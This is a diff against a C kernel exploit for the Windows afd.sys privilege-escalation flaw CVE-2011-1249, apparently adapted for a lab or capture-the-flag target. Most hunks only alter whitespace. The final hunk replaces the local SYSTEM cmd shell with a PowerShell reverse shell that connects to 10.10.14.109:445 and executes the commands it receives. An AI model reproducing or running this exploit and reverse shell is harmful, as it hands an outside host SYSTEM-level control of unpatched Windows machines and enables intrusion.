@@ -8,7 +8,7 @@
 #   Windows XP Pro SP2 x64
 #   Windows Server 2003 SP2 x86
 #   Windows Server 2003 SP2 x64
-#   Windows Server 2003 SP2 Itanium-based Systems
+#   Windows Server 2003 SP2 Itanium-based Systems 
 #   Windows Vista SP1 x86
 #   Windows Vista SP2 x86
 #   Windows Vista SP1 x64
@@ -48,10 +48,10 @@
 # CVE ID: 2011-1249
 ################################################################
 # Vulnerability description:
-#   The Ancillary Function Driver (AFD) supports Windows sockets
+#   The Ancillary Function Driver (AFD) supports Windows sockets 
 #   applications and is contained in the afd.sys file. The afd.sys
 #   driver runs in kernel mode and manages the Winsock TCP/IP
-#   communications protocol.
+#   communications protocol. 
 #   An elevation of privilege vulnerability exists where the AFD
 #   improperly validates input passed from user mode to the kernel.
 #   An attacker must have valid logon credentials and be able to
@@ -498,7 +498,7 @@ int main(void)
     }
 
 
-    // retrieve the list of loaded modules
+    // retrieve the list of loaded modules 
     ZwQuerySystemInformation(11, systemInformationBuffer, systemInformation * sizeof(*systemInformationBuffer), NULL);
 
     // locate "ntkrnlpa.exe" or "ntoskrnl.exe" in the retrieved list of loaded modules
@@ -518,7 +518,7 @@ int main(void)
             targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
             foundModule = TRUE;
             break;
-        }
+        }    
         else if(strstr(loadedMdlStructPtr[i].ImageName, "ntoskrnl.exe"))
         {
             printf("   [+] ntoskrnl.exe\n");
@@ -526,7 +526,7 @@ int main(void)
             targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
             foundModule = TRUE;
             break;
-        }
+        }     
     }
 
     // base address of the loaded module (kernel space)
@@ -799,7 +799,8 @@ int main(void)
     // spawn shell (with elevated privileges)
     printf("         [*] Spawning shell\n");
     // spawn SYSTEM shell within the current shell (remote shell friendly)
-    system ("c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32");
+    //system ("c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32");
+    system ("c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
 
     // clean up and exit
     printf("\n[*] Exiting SYSTEM shell\n");
